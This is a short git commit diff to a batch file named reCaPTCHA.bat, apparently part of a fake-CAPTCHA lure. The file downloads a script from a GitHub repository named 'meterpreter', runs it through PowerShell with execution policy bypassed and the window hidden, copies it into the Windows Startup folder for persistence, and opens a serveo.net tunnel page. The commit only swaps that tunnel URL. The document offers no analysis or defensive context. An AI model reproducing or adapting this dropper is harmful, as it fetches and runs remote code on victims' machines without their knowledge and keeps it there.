a55649cc22021145bf4859b22a88081bb83d4897
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-09-21 21:23:52 +0300

    Update reCaPTCHA.bat

--- reCaPTCHA.bat
+++ reCaPTCHA.bat
@@ -2,4 +2,5 @@
 curl https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat -o "%temp%\start.bat"
 powershell -ep bypass -WindowStyle Hidden -File "%temp%\start.bat"
 move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-start https://fbed484c6ea22e0467671566e490de70.serveo.net/reCaPTCHA/r.html
+start https://defa6afad8d2a559be5ed784245d4cdb.serveo.net\reCaPTCHA\r.html
+
